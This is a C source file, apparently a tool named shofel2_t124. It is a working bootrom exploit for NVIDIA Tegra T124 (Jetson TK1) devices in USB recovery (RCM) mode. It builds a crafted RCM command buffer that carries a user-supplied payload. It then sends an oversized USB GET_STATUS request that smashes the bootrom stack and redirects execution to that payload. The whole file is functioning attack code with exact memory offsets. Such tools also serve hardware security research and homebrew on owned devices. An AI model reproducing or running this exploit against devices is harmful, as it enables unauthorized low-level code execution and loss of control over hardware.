#include <fcntl.h>
#include <libusb.h>
#include <linux/usbdevice_fs.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#define JETSON_TK1_PID 0x0955
#define JETSON_TK1_VID 0x7140

#define USB_BULK_TIMEOUT 500

#define BOOTROM_USB_BUF_1       0x40004000
#define BOOTROM_USB_BUF_2       0x40008000
#define BOOTROM_SMASH_TARGET    0x4000DCD8
#define BOOTROM_SMASH_LEN       (BOOTROM_SMASH_TARGET - BOOTROM_USB_BUF_2)

#define USB_CTRL_DEVICE_ENDPOINT_TO_HOST 0x82
#define USB_CTRL_GET_STATUS 0x00
// #define USB_CTRL_GET_STATUS_LENGTH 0x1000
#define USB_CTRL_GET_STATUS_LENGTH BOOTROM_SMASH_LEN

#define RCM_EP1_IN      0x81
#define RCM_EP1_OUT     0x01
#define RCM_CHIP_ID_LEN 0x10
#define RCM_CMD_BUF_LEN 0x7000
#define RCM_CMD_BUF_PAYLOAD_INIT_POS 0x284
#define RCM_CMD_BUF_MEMCPY_RET_POS (RCM_CMD_BUF_PAYLOAD_INIT_POS + BOOTROM_SMASH_LEN - 0x30C - 0x4)

#define MAX_PAYLOAD_FILE_SIZE (RCM_CMD_BUF_MEMCPY_RET_POS - RCM_CMD_BUF_PAYLOAD_INIT_POS)

void print_hex_memory(void *mem, size_t size) {
  uint8_t *p = (uint8_t *)mem;
  for (int i = 0; i < size ; i++) {
    if (((i % 16) == 0) && i)
      printf("\n");
    printf("0x%02x ", p[i]);
  }
  printf("\n");
}

struct setup_data {
	uint8_t bRequestType;
	uint8_t bRequest;
	uint16_t wValue;
	uint16_t wIndex;
	uint16_t wLength;
	uint8_t data[USB_CTRL_GET_STATUS_LENGTH];
};

int main(int argc, char *argv[]) {

  uint8_t ret;

  if (argc != 2) {
    printf("Error: invalid argument count. shofel2_t124 payload.bin\n");
    ret = -1;
    goto exit;
  }

  // ---- FIND K1 RCM ----
  //TODO: Remove libusb dependency...
  libusb_init(NULL);
  libusb_device_handle *dev_h = NULL;
  printf("Waiting T124 to enter RCM mode. Note: root permission could be required.\n");
  while(!dev_h) {
    dev_h = libusb_open_device_with_vid_pid(NULL,  (uint16_t)JETSON_TK1_PID, (uint16_t)JETSON_TK1_VID);
    usleep(500);
  }
  struct libusb_device *dev = libusb_get_device(dev_h);
  uint8_t rcm_usb_bus = libusb_get_bus_number(dev);
  uint8_t rcm_usb_add = libusb_get_device_address(dev);
  libusb_close(dev_h);
  libusb_exit(NULL);

  char path[256];
  sprintf(path, "/dev/bus/usb/%03d/%03d", rcm_usb_bus, rcm_usb_add);
  printf("USB File Path: %s\n", path);
  int rcm_usb_fd = open(path, O_RDWR);
  if (rcm_usb_fd == -1) {
    perror(NULL);
    ret = -1;
    goto exit;
  }
  //-----------------------

  // ---- INIT RCM ----
  uint8_t chip_id_buf[RCM_CHIP_ID_LEN];
  memset(&chip_id_buf, 0, sizeof (chip_id_buf));

  struct usbdevfs_bulktransfer rcm_init_msg;
  memset(&rcm_init_msg, 0, sizeof (rcm_init_msg));
  rcm_init_msg.ep = RCM_EP1_IN;
  rcm_init_msg.len = RCM_CHIP_ID_LEN;
  rcm_init_msg.timeout = USB_BULK_TIMEOUT;
  rcm_init_msg.data = chip_id_buf;

  ret = ioctl(rcm_usb_fd, USBDEVFS_BULK, &rcm_init_msg);
  if (ret != 0x10) {
    printf("Error: Couldn't read Chip ID. Please reset T124 in RCM mode again.\n");
    ret = -1;
    goto exit;
  }
  printf("Chip ID: ");
  print_hex_memory(chip_id_buf, RCM_CHIP_ID_LEN);
  //-----------------------

  // ---- SEND PAYLOAD ----
  uint8_t rcm_cmd_buf[RCM_CMD_BUF_LEN];
  memset(rcm_cmd_buf, 0x00, sizeof(rcm_cmd_buf));
  
  const uint8_t rcm_cmd_len[4] = { 0x74, 0x22, 0x03, 0x00 }; // 0x32274 Bytes
  const uint8_t payload_entry[4] = {0x01, 0xe0, 0x00, 0x40}; // 0x4000E000|1 (|1 Thumb mode bit) 

  // TODO: Use IRAM space after memcpy return pos. Anyway, probably 22KB are enought for mostly of the payloads...
  uint8_t payload_file_buf[MAX_PAYLOAD_FILE_SIZE];
  int payload_file_fd = open(argv[1], O_RDONLY);
  if (payload_file_fd == -1) {
    printf("Error: Couldn't open the payload file.\n");
    ret = -1;
    goto exit;
  }
  struct stat payload_file_stat;
  fstat(payload_file_fd, &payload_file_stat);
  if (payload_file_stat.st_size > MAX_PAYLOAD_FILE_SIZE) {
    printf("Error: Payload file exceeds max payload size: %d bytes.\n", MAX_PAYLOAD_FILE_SIZE);
    ret = -1;
    goto exit;
  }

  uint32_t n_bytes = read(payload_file_fd, payload_file_buf, MAX_PAYLOAD_FILE_SIZE);

  memcpy(rcm_cmd_buf, rcm_cmd_len, 0x4);
  memcpy(&rcm_cmd_buf[RCM_CMD_BUF_PAYLOAD_INIT_POS], payload_file_buf, n_bytes);
  memcpy(&rcm_cmd_buf[RCM_CMD_BUF_MEMCPY_RET_POS], payload_entry, 0x4);

  struct usbdevfs_bulktransfer usb_rcm_cmd;
  memset(&usb_rcm_cmd, 0, sizeof (usb_rcm_cmd));
  usb_rcm_cmd.ep = RCM_EP1_OUT;
  usb_rcm_cmd.len = RCM_CMD_BUF_LEN;
  usb_rcm_cmd.timeout = USB_BULK_TIMEOUT;
  usb_rcm_cmd.data = rcm_cmd_buf;

  ret = ioctl(rcm_usb_fd, USBDEVFS_BULK, &usb_rcm_cmd);
  if (ret != 0) {
    printf("Error: Couldn't send RCM CMD.\n");
    ret = -1;
    goto exit;
  }
  //----------------------

  // ---- RUN EXPLOIT ----
  struct setup_data hacky_get_status_buf;
  memset(&hacky_get_status_buf, 0, sizeof (hacky_get_status_buf));
  hacky_get_status_buf.bRequestType = USB_CTRL_DEVICE_ENDPOINT_TO_HOST;
  hacky_get_status_buf.bRequest = USB_CTRL_GET_STATUS;
  hacky_get_status_buf.wValue = 0;
  hacky_get_status_buf.wIndex = 0;
  hacky_get_status_buf.wLength = USB_CTRL_GET_STATUS_LENGTH;

  struct usbdevfs_urb usb_hacky_get_status;
  memset(&usb_hacky_get_status, 0, sizeof (usb_hacky_get_status));
  usb_hacky_get_status.type          = USBDEVFS_URB_TYPE_CONTROL;
  usb_hacky_get_status.endpoint      = 0x0;
  usb_hacky_get_status.buffer        = &hacky_get_status_buf;
  usb_hacky_get_status.buffer_length = sizeof(hacky_get_status_buf);

  ioctl(rcm_usb_fd, USBDEVFS_SUBMITURB, &usb_hacky_get_status);
  ioctl(rcm_usb_fd, USBDEVFS_REAPURB32, 0);
  
  if (usb_hacky_get_status.status == 0) {
    printf("Error: Hacky Get Status finished correctly... Not cool :-(\n");
    print_hex_memory(hacky_get_status_buf.data, USB_CTRL_GET_STATUS_LENGTH);
    ret = -1;
    goto exit;
  }

  printf("Hacky Get Status returned error... Probably the stack got smashed, Congrats :-)\n");
  //----------------------

  ret = 0;

exit:
  if (rcm_usb_fd) close(rcm_usb_fd);
  if (payload_file_fd) close(payload_file_fd);
  return ret;
}

